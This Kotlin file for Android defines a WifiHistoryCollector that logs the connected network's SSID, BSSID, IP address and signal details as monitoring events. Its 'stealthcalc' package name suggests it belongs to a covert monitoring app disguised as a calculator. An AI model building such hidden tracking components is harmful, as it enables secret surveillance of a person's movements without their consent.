package com.stealthcalc.monitoring.collector

import android.annotation.SuppressLint
import android.content.Context
import android.net.wifi.WifiManager
import android.text.format.Formatter
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.MonitoringEventKind
import com.stealthcalc.monitoring.model.WifiHistoryPayload
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class WifiHistoryCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
) {
    private val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
    private var lastSsid: String? = null
    private var lastBssid: String? = null

    @SuppressLint("MissingPermission")
    suspend fun collect() {
        if (!repository.isMetricEnabled("wifi_history")) return
        val wm = wifiManager ?: return

        val info = wm.connectionInfo ?: return
        val ssid = info.ssid?.removePrefix("\"")?.removeSuffix("\"")
            ?.takeIf { it != "<unknown ssid>" } ?: return
        val bssid = info.bssid

        if (ssid == lastSsid && bssid == lastBssid) return
        lastSsid = ssid
        lastBssid = bssid

        @Suppress("DEPRECATION")
        val ip = Formatter.formatIpAddress(info.ipAddress)

        val payload = Json.encodeToString(
            WifiHistoryPayload(
                ssid = ssid,
                bssid = bssid,
                signalLevel = WifiManager.calculateSignalLevel(info.rssi, 5),
                frequency = info.frequency,
                ipAddress = ip,
                linkSpeed = info.linkSpeedMbps,
                connected = true,
                timestampMs = System.currentTimeMillis(),
            )
        )
        repository.recordEvent(MonitoringEventKind.WIFI_HISTORY, payload)
    }
}
